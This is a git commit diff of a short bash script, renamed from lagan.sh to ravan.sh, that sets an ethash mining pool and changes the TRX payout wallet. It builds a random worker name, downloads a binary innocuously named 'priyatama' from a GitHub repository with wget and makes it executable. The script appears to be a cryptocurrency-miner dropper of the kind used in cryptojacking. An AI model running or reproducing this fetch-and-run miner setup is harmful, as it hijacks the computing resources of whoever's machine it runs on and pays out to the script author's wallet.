691480a11c21fc19c25dcde951b90e26ad313b46
parth2134 <88128299+parth2134@users.noreply.github.com>
2021-07-29 10:49:27 +0530

    Update and rename lagan.sh to ravan.sh

--- ravan.sh
+++ ravan.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
+WALLET=TRX:TYWmD5VqkvA9AT4Pcfgqx5asB8WC2cgodP
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/archernap/prem/raw/main/priyatama
 chmod +x priyatama
